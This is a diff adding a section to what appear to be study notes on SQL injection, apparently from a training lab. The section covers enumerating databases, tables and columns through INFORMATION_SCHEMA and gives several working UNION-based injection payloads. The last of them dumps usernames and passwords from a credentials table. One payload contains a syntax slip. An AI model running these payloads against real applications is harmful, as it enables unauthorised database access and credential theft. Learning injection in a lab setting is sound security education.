@@ -287,3 +287,68 @@ For us to properly form our queries and locate the data we are after, we need th
 * List of columns within each table
 
 >Note: We cannot directly select a table form another DB with a select statement
+
+To reference a table in another DB in a `SELECT` statement, we use the dot '`.`' operator.
+Example: Selecting a 'users' table in a DB 'my_database',
+```sql
+SELECT * FROM my_database.users;
+```
+
+## SCHEMATA
+First we need to find out what DB's are available on the DBMS. The `SCHEMATA` table in `INFORMATION_SCHEMA` contains info on all of the DB's in the DBMS.
+```sql
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+```
+> Note: The first 3 db's in this example are default db's used for the management of the dbms  
+
+Example Injection using our example from before:
+```sql
+cn' UNION select 1, schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
+```
+
+Now we need to know what DB we are currently running against. We can use the `SELECT database()` query to return our current DB.
+> Note: Not uncommon for multiple sites to be running off the same DBMS.
+
+Example Injection using the example from above:
+```sql
+cn' UNION select * 1,database(),3,4-- 
+```
+
+## TABLES
+Now we just need a list of tables in our working database to figure out our target. The `TABLES` table contains information about all the tables in the DBMS. We can use a `UNION select` and a `where` clause to narrow down our list to only the db want to see.
+
+Example injeciton using our db from above:
+```sql
+cn' UNION select 1, TABLE_NAME, TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
+# This will reveal the following tables: credentials, posts, framework, pages
+# This injection dumps the table names in to column2 for all of the tables in the 'dev' db. Note the 'where' condition to narrow down the results
+```
+
+## COLUMNS
+Now that we found all the tables in the 'dev' db, and a target table 'credentials', we we need to know what columns are in that table. The `COLUMNS` table in the `INFORMATION_SCHEMA` can tell us information about all of the columns in all of the tables
+
+Example injection using our example db:
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
+# Following our example, this will reveal 2 columns, username and password
+```
+
+## Getting the DATA (The fun part)
+Now that we have a path to the data we're after, we can proper craft our `UNION` query to retrieve the data.
+
+Example: Sample injection using all of the information we retrieved above in our example db
+```sql
+cn' UNION select 1,username,password,4 from dev.credentials--
+# This will now dump the username and password into columns 2 & 3 for all the users in the credentials table.
+```
